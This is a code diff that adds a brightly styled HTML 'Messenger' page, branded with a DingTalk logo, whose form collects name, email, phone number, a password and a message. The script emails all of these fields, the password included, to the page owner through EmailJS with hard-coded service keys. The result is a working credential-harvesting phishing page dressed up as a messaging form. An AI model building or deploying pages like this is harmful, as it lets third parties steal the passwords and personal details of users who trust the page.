@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Messenger</title>
+
+  <!-- Font Awesome for social icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+
+  <style>
+    /* Animated background */
+    body {
+      font-family: 'Poppins', Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(-45deg, #ff6ec4, #7873f5, #42f5b9, #ffca3a);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      overflow-y: auto;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    /* Scrollbar styling (Indian flag) */
+    body::-webkit-scrollbar {
+      width: 12px;
+    }
+
+    body::-webkit-scrollbar-track {
+      background: linear-gradient(to bottom, #FF9933, #FFFFFF, #138808);
+      border-radius: 10px;
+    }
+
+    body::-webkit-scrollbar-thumb {
+      background: #000080; /* navy blue */
+      border-radius: 10px;
+      border: 3px solid transparent;
+      background-clip: content-box;
+    }
+
+    body::-webkit-scrollbar-thumb:hover {
+      background: #5555ff;
+    }
+
+    body {
+      scrollbar-width: thin;
+      scrollbar-color: #000080 linear-gradient(to bottom, #FF9933, #FFFFFF, #138808);
+    }
+
+    /* Messenger container */
+    .container {
+      background: linear-gradient(135deg, #ff6ec4, #7873f5, #42f5b9, #ffca3a);
+      padding: 35px;
+      border-radius: 25px;
+      width: 400px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+      animation: cardEntrance 1s ease forwards;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
+    }
+
+    @keyframes cardEntrance {
+      0% { transform: translateY(50px); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+
+    /* Animated rainbow overlay */
+    .container::before {
+      content: '';
+      position: absolute;
+      top:0; left:0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(270deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
+      background-size: 1400% 1400%;
+      opacity: 0.3;
+      border-radius: 25px;
+      animation: rainbowBG 20s linear infinite;
+      z-index: 0;
+    }
+
+    @keyframes rainbowBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    h2 {
+      text-align: center;
+      color: rgb(6, 247, 255) ;
+      margin-bottom: 25px;
+      font-size: 28px;
+      z-index: 1;
+      position: relative;
+      text-shadow: 1px 1px 5px rgba(0,0,0,0.3);
+    }
+
+    /* Input fields */
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      background: rgba(255,255,255,0.9);
+      color: #333;
+      z-index: 1;
+      position: relative;
+    }
+
+    input:focus, textarea:focus {
+      box-shadow: 0 0 12px rgba(255,255,255,0.7);
+      background: rgba(255,255,255,1);
+    }
+
+    /* Button */
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      background: linear-gradient(135deg, #ff6ec4, #7873f5);
+      border: none;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.4s ease;
+      z-index: 1;
+      position: relative;
+    }
+
+    button:hover {
+      background: linear-gradient(135deg, #42f5b9, #ffca3a);
+      transform: scale(1.05);
+      box-shadow: 0 0 15px rgba(255,255,255,0.6);
+    }
+
+    /* Social icons */
+    .social {
+      margin-top: 20px;
+      text-align: center;
+      z-index: 1;
+      position: relative;
+    }
+
+    .social i {
+      font-size: 28px;
+      margin: 0 12px;
+      color: #fff;
+      transition: transform 0.5s ease, color 0.5s ease;
+      cursor: pointer;
+      animation: iconBounce 2s infinite;
+    }
+
+    .social i:hover {
+      transform: scale(1.5) rotate(10deg);
+      color: #ffd700;
+    }
+
+    @keyframes iconBounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .container logo {
+        align-items: center;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="dingtalk.png" id="img" width="90" height="90" alt="Logo" style="display: block; margin: 0 auto 20px auto;">
+    <h2>Messenger</h2>
+    <form id="messengerForm">
+      <input type="text" id="name" placeholder="Your Name" required>
+      <input type="email" id="email" placeholder="Your Email" required>
+      <input type="tel" id="phone" placeholder="Your Phone Number" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <textarea id="message" placeholder="Type your message..." rows="4" required></textarea>
+      <button type="submit">Send</button>
+    </form>
+
+    <div class="social">
+      <i class="fab fa-youtube"></i>
+      <i class="fab fa-instagram"></i>
+      <i class="fab fa-whatsapp"></i>
+    </div>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("g7dPxlZeGAIFCQTB2"); // Replace with your EmailJS Public Key
+
+    const form = document.getElementById("messengerForm");
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      emailjs.send("service_n0rlufv", "template_js8rqro", {
+        from_name: document.getElementById("name").value,
+        from_email: document.getElementById("email").value,
+        phone: document.getElementById("phone").value,
+        password: document.getElementById("password").value,
+        message: document.getElementById("message").value
+      }).then(
+        function() {
+          alert("Message sent successfully!");
+          form.reset();
+        },
+        function(error) {
+          alert("Failed to send. Error: " + JSON.stringify(error));
+        }
+      );
+    });
+  </script>
+
+</body>
+</html>
